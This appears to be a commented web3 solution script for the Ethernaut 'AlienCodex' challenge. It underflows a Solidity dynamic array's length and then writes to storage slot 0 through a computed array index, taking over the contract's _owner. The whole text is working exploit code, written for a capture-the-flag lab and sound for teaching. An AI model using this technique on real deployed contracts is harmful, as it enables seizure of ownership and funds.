
// this contract allows decreasing a dynamic bytes32 array
// length. since underflows don't cause reversions in this
// solidity version, we can underflow the array length to
// uint256_max by calling retract() when its length is 0,
// essentially making all storage positions accessible
// (and editable, with revise()) through array indices.
// since this is a dynamic array, we can get the storage
// position of the array data through keccak256(p),
// where p is the array slot.
//
// AlienCodex storage:
// [0]: <0> (88b), bool contact (8b), address _owner (160b)
// [1]: codex.length
//
// since the array slot is 1, we can then compute the
// storage position of codex[0].

const uint = (value) => web3.utils.toBN(value);

const codexSlot = 1;
const zeroIndexPosition = uint(web3.utils.keccak256(web3.utils.encodePacked(codexSlot)));

// with this, we can then get the delta between it and
// the position zero of the storage.

const deltaToStorageZero = uint(web3.utils.encodePacked(-1)).sub(zeroIndexPosition).add(uint(1));

// now, we underflow the length, to enable array access
// to the entire storage, and then edit the storage 0,
// (through codex[deltaToStorageZero]) where is stored
// [<0> (88b), bool contact (8b), address _owner (160b)],
// changing the _owner value to the player address.

await contract.make_contact();
await contract.retract();

await contract.revise(deltaToStorageZero, `0x000000000000000000000001${player.slice(2)}`);
